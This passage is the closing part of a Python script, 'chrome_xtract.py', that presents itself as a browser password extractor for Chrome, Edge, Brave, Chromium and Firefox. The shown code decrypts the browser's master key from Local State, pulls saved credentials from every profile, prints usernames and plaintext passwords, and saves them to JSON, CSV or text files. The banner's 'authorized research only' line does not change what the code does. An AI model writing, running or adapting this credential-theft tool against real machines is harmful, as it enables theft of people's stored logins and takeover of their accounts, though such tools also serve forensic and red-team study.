    print(f"{C.DIM}{bar}{C.RST}")
    for r in rows:
        print(sep.join(f"{str(r.get(c,'')):<{widths[c]}}" for c in cols))
    print()

def save_output(rows: list[dict], path: str) -> None:
    ext = os.path.splitext(path)[1].lower()
    if ext == ".json":
        with open(path, "w", encoding="utf-8") as f:
            json.dump(rows, f, indent=2, ensure_ascii=False)
    elif ext == ".csv":
        import csv
        with open(path, "w", newline="", encoding="utf-8") as f:
            w = csv.DictWriter(f, fieldnames=["Profile", "URL", "Username", "Password"])
            w.writeheader(); w.writerows(rows)
    else:
        with open(path, "w", encoding="utf-8") as f:
            for r in rows:
                f.write(
                    f"Profile  : {r['Profile']}\n"
                    f"URL      : {r['URL']}\n"
                    f"Username : {r['Username']}\n"
                    f"Password : {r['Password']}\n"
                    f"{'-'*50}\n"
                )
    print(C.ok(f"Saved {len(rows)} password(s) → {path}"))

def print_summary(browser_display: str, profiles: int, total: int) -> None:
    print(f"\n{C.head('  ── SUMMARY ──')}\n")
    print(f"  {'Browser'  :<10}: {browser_display}")
    print(f"  {'User'     :<10}: {os.environ.get('USERNAME', '?')}")
    print(f"  {'Profiles' :<10}: {profiles}")
    print(f"  {'Passwords':<10}: {C.ok(str(total)) if total else C.warn('0')}\n")


# ─────────────────────────────────────────────────────────────────────────────
# ██████████████████████████  BANNER + MAIN  ██████████████████████████████████
# ─────────────────────────────────────────────────────────────────────────────

BANNER = rf"""
{C.CYN}   _____ _                              _  __  ___           __
  / ___/| |_  _ __ ___   _ __ ___  ___| |/ /_/ _ \ __  __ / /_
 | |    | ' \| '__/ _ \ | '_ ` _ \/ _ \ | '__/ /_\ \\ \/ // __|
 | |___ | | || | | (_) || | | | | |  __/ | |  |  _  | >  < \__ \
  \____||_|_||_|  \___/ |_| |_| |_|\___|_|_|  |_| |_|/_/\_\ ___/{C.RST}

  {C.DIM}Browser Password Extractor  ·  github.com/mohanmg04/browser-data-extractor{C.RST}
  {C.YEL}For authorized security research and laboratory environments only.{C.RST}
"""


def chrome_xtract(
    browser:     str,
    verbose:     bool       = False,
    hide_banner: bool       = False,
    output:      str | None = None,
) -> None:

    global _V
    _V = verbose

    if not hide_banner:
        print(BANNER)

    display = BROWSER_DISPLAY.get(browser.lower(), browser)
    print(C.info(f"Target : {C.BLD}{display}{C.RST}"))
    _log(f"User   : {os.environ.get('USERNAME','?')}")
    _log(f"SID    : {get_current_sid()}")
    _log(f"Admin  : {is_admin()}")
    _log(f"SYSTEM : {is_system()}")

    # ── Firefox path ──────────────────────────────────────────────────────────
    if browser.lower() == "firefox":
        run_firefox(output)
        return

    # ── Chromium path ─────────────────────────────────────────────────────────
    paths = CHROMIUM_PATHS.get(browser.lower())
    if not paths:
        print(C.err(f"Unsupported browser: {browser}")); return

    local_state = paths["local_state"]
    user_data   = paths["user_data"]

    if not os.path.exists(local_state):
        print(C.err(f"Local State not found:\n  {local_state}")); return
    if not os.path.isdir(user_data):
        print(C.err(f"User Data not found:\n  {user_data}")); return

    profiles = get_chromium_profile_dirs(user_data)
    if not profiles:
        print(C.err("No browser profiles found.")); return

    print(C.info(f"Profiles: {len(profiles)} found"))

    blob_type = detect_blob_type(user_data, browser)
    print(C.info(f"Blob type: {blob_type}"))

    try:
        master_key = get_master_key_v20(local_state) if blob_type == "v20" \
                     else get_master_key_v10(local_state)
        print(C.ok("Master key decrypted"))
    except PermissionError as exc:
        print(C.err(str(exc))); return
    except Exception as exc:
        print(C.err(f"Master key error: {exc}")); return

    all_passwords: list[dict] = []
    for prof in profiles:
        pname = os.path.basename(prof)
        found = extract_chromium_passwords(prof, browser, pname, master_key)
        _log(f"  {pname}: {len(found)} password(s)")
        all_passwords.extend(found)

    print_summary(display, len(profiles), len(all_passwords))

    if all_passwords:
        print_table(all_passwords)
        if output:
            save_output(all_passwords, output)
    else:
        print(C.warn("No saved passwords found."))


# =============================================================================
# CLI
# =============================================================================
if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="chrome_xtract.py — Browser Password Extractor",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
examples:

  [1] Extract passwords from Chrome
      python chrome_xtract.py -Browser chrome

  [2] Extract passwords from Firefox
      python chrome_xtract.py -Browser firefox

  [3] Extract from Edge — save as JSON
      python chrome_xtract.py -Browser edge -Output passwords.json

  [4] Extract from Brave — save as CSV
      python chrome_xtract.py -Browser brave -Output passwords.csv

  [5] Verbose run, suppress banner
      python chrome_xtract.py -Browser firefox -Verbose -HideBanner
        """,
    )
    parser.add_argument(
        "-Browser",
        required=True,
        choices=ALL_BROWSERS,
        metavar="BROWSER",
        help="chrome | edge | brave | chromium | cft | firefox",
    )
    parser.add_argument("-Verbose",    action="store_true", help="Enable verbose / debug output")
    parser.add_argument("-HideBanner", action="store_true", help="Suppress the ASCII banner")
    parser.add_argument(
        "-Output",
        metavar="FILE",
        help="Save passwords to file  (.json / .csv / .txt)",
    )

    args = parser.parse_args()
    chrome_xtract(
        browser     = args.Browser,
        verbose     = args.Verbose,
        hide_banner = args.HideBanner,
        output      = args.Output,
    )
